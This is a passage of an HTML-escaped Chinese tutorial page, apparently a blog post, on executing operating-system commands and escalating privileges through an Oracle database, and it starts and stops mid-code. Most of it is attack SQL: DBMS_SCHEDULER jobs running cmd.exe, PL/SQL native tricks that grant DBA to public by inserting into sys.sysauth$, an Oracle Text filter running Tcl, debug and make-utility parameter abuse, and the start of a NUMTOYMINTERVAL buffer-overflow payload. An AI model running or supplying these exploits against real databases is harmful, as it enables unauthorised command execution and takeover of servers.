keyword&#34;&gt;execute&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;ENABLED&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; DUAL&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OPEN&lt;/span&gt; Cl&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FETCH&lt;/span&gt; Cl &lt;span class=&#34;token keyword&#34;&gt;BULK&lt;/span&gt; COLLECT &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; POL&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;CLOSECI&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;DBMS_JVM_EXP_PERMS&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;IMPORT_JVM_PERMS&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;POL&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;DBMS_SCHEDULER&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;DBMS_SCHEDULER是Oracle 10g及之后版本中新增的内容，它要求拥有CREATE JOB (10gR1)或 CREATE EXTERNAL JOB(10gR2/11g)权限。自 10.2.0.2 起，不能再以 oracle 用户身 份执行操作系统命令，而要以nobody用户执行：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;--Create a Program for dbms_scheduler&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; DBMS_SCHEDULER&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create_program&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;RDS2009&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;EXECUTABLE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;c:\WINDOWS\system32\cmd.exe /c echo Owned &amp;gt;&amp;gt; c:\rds3.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;--Create, execute, and delete a Job for dbms_scheduler&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; DBMS_SCHEDULER&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create_job&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;job_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;RDS2009JOB&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;program_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;RDS2009&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;start_date &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;repeat_interval &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;end_date &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;enabled &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;auto_drop &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;PL/SQL native&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;拥有修改数据库服务器上SPNC_COMMANDS文本文件的权限。如果创建了存储过程、函数或包并启用了 PL/SQL native,那么Oracle会执行该文件中的所有内容。&lt;/p&gt;
&lt;p&gt;下列代码使用PL/SQL native为public授予DBA权限。grant命令是一条通常以SYS用户身份执行的INSERT INTO SYSAUTHS$命令。&lt;/p&gt;
&lt;p&gt;本例中，我们创建了一个名为e2.sql且由sqlplus 执行的文本文件，sqlplus命令可通过PL/SQL native来启动：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FUNCTION&lt;/span&gt; Fl &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; number
authid &lt;span class=&#34;token keyword&#34;&gt;current_user&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt;
pragma autonomous_transaction&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
v_file UTL_FILE&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;FILE_TYPE&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; IMMEDIATE q&lt;span class=&#34;token string&#34;&gt;&#39;!create directory TX as &#39;&lt;/span&gt;C:\&#39;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;;
begin
-- grant dba to public;
DBMS_ADVISOR.CREATE_FILE (&#39;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;insert&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sysauth$ &lt;span class=&#34;token keyword&#34;&gt;values&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;||chr(13)||chr(10)||&#39;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;TX&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;e2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;);
end;
EXECUTE IMMEDIATE q&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;drop&lt;/span&gt; directory TX&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;;
EXECUTE IMMEDIATE q&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; directory T &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\ORACLE\ORA101\PLSQL&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;; 
utl_file.fremove(&#39;&lt;/span&gt;T&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;spnc_commands&lt;span class=&#34;token string&#34;&gt;&#39;);
v_file: = utl_file.fopen (&#39;&lt;/span&gt;T&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;spnc_commancis&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;w&lt;span class=&#34;token string&#34;&gt;&#39;);
utl_file.put_line(v_file,&#39;&lt;/span&gt;sqlplus &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; sysdba &lt;span class=&#34;token variable&#34;&gt;@c&lt;/span&gt;:\e2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;); 
utl_file.fclose(v_file);
EXECUTE IMMEDIATE q&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;drop&lt;/span&gt; directory T&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;;
EXECUTE IMMEDIATE q&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; plsql_compiler_flags&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;NATIVE&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;; 
EXECUTE IMMEDIATE q&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; system &lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; plsql_native_library_dir&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;C:\&#39;!&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; IMMEDIATE q&lt;span class=&#34;token string&#34;&gt;&#39;!create or replace procedure hl as begin null; 
end;!&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;COMMIT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;RETURN&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Oracle Text&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Oracle Text也可以执行操作系统命令。通过用户自定义的过滤器(USER_FILTER_PREF), 可以将表的内容传递给用户自定义的过滤器。在下面的例子中，通过一个表将TCL代码传递 给用户自定义的过滤器。&lt;/p&gt;
&lt;p&gt;使用Oracle Text用户自定义的过滤器存在着一个限制。只能从ORACLE_HOME/bin目录执行。例如，oratclsh.exe就可以执行。对于这一限制，可以使用UTL_FILE包将相应的可执行文件复制到ORACLE_HOME/bin目录，以便执行该文件：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; t &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id number&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;primary&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt; varchar2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;Begin&lt;/span&gt;
ctxsys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ctx_ddl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;drop_preference&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;USER_FILTER_PREF&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;begin&lt;/span&gt;
ctxsys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ctx_ddl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create_preference
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;
preference_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;USER_FILTER_PREF&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
object_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;USER_FILTER&#39;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
ctxsys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ctx_ddl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;set_attribute
&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;USER_FILTER_PREF&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;COMMAND&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;oratclsh.exe&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;begin&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;insert&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; t &lt;span class=&#34;token keyword&#34;&gt;values&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;
set f [open &#34;C:/AHT.txt&#34; {RDWR CREAT}]
puts $f &#34;Your System is not protected!&#34;
close $f
set f [open [lindex $argv 0] {RDWR CREAT}]
puts $f &#34;SUCCESSH&#34;
close $f
&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;drop&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;index&lt;/span&gt; user_filter_idx&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;index&lt;/span&gt; user_filter_idx &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; t &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
indextype &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; ctxsys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;context
parameters &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;FILTER USER_FILTER_PREF&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; token_text &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; DR$USER_FILTER_IDX$I&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;Alter System set 事件&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Alter System set是一种非公开参数(自Oracle 10g以来)，它可以指定自定义调试器的名称。 在调试事件(debugging event)过程中将执行自定义的调试器，而调试事件则需予以强制实现。 例如：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; system &lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;_oradbg_pathname&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/tmp/debug.sh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;PL/SQL native 9i&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;自9iR2以来，Oracle提供了将PL/SQL代码转换成C代码的方法。为提高灵活性，Oracle 可以修改make工具的名称(例如，修改成calc.exe或其他可执行文件)。例如：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; system &lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; plsql_native_make_utility&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;cmd.exe /c echo Owned &amp;gt; c:\ rds.txt &amp;amp;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; plsql_compiler_flags&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;NATIVE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;Create&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;procedure&lt;/span&gt; rds &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;begin&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;缓冲区溢出&lt;/p&gt;
&lt;p&gt;2004 年，Cesar Cerrudo 公布 了关于 Oracle 中 NUMTOYMINTERVA 和 NUMTODSINTERVAL 这两个函数的一种缓冲区溢出漏洞，使用下列漏洞在数据库服务器上运行操作系统命令：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; NUMTOYMINTERVAL &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;AAAAAAAAAABBBBBBBBBBCCCCCCCCCCABCDEFGHIJKLMNOPQR&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;59&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;79&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;150&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;01&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;141&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;chr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;68&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span 